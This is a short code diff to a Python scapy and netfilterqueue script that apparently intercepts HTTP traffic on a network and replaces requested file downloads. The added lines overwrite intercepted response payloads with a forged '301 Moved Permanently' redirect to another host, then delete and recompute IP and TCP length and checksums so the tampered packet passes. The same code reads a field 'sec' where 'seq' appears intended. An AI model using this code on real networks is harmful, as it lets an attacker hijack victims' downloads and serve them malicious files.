@@ -24,6 +24,14 @@ def process_packet(packet):
             if scapy_packet[scapy.TCP].sec in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].sec)  # once identified we can clear the list
                 print("[*] Replacing file")
+                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\n" \
+                                               "Location: http://www.example.org/index.asp"
+                del scapy_packet[scapy.IP].len
+                del scapy_packet[scapy.IP].chksum
+                del scapy_packet[scapy.TCP].chksum
+                packet.set_payload(str(scapy_packet))
+
+    packet.accept()
 
 
 queue = netfilterqueue.NetfilterQueue()
